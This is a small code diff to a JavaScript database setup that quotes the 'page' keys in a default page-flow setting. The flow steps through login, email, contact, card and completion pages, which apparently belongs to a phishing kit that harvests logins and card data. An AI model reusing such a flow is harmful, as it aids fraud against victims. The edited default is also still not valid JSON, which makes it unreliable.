@@ -50,12 +50,12 @@ export async function initDB() {
 	    baSUB INTEGER DEFAULT 0 CHECK (baSUB IN (0,1)),
 	    domain TEXT DEFAULT '',
 	    pageFlow TEXT NOT NULL DEFAULT '{
-		    "1": { page: "login", enabled: true },
-		    "2": { page: "email", enabled: true },
-		    "3": { page: "contact", enabled: true },
-		    "4": { page: "card", enabled: true },
-		    "5": { page: "complete", enabled: true },
-		    "6": { page: "final", enabled: true }
+		    "1": { "page": "login", enabled: true },
+		    "2": { "page": "email", enabled: true },
+		    "3": { "page": "contact", enabled: true },
+		    "4": { "page": "card", enabled: true },
+		    "5": { "page": "complete", enabled: true },
+		    "6": { "page": "final", enabled: true }
 		}'
 	  );
 	`);
